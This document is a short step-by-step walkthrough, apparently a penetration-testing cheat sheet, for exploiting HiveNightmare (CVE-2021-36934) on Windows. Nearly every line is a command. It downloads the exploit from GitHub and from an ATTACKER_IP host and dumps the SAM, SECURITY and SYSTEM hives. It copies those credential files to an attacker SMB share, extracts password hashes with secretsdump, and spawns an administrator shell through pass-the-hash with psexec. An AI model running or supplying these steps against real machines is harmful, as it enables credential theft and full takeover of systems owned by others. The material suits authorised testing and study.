# HiveNightmare AKA Serious SAM CVE-2021-36934

## Steps

#### 1) Check the specific Windows Version

    [System.Environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      19043  0

#### 2) Download HiveNightmare on our machine, then transfer it to the target machine.

    wget https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe

    wget "http://ATTACKER_IP/HiveNightmare.exe" -outfile "c:\pwn\HiveNightmare.exe"

#### 3) Run HiveNightmare.exe to dump the registry hives.

    ./HiveNightmare.exe

#### 4) Transfer the hives to our machine

Attacker machine

    impacket-smbserver test /home/kali/Sams_test -username test -password test -smb2support

Target machine

    net use \\ATTACKER_IP\test test /user:test

    copy SAM \\ATTACKER_IP\test
    copy SECURITY \\ATTACKER_IP\test
    copy SYSTEM \\ATTACKER_IP\test

#### 5) Dump hashes

    impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

#### 6) Spawn cmd as administrator

    impacket-psexec -hashes LM:NTLM_HASH administrator@TARGET_IP cmd.exe
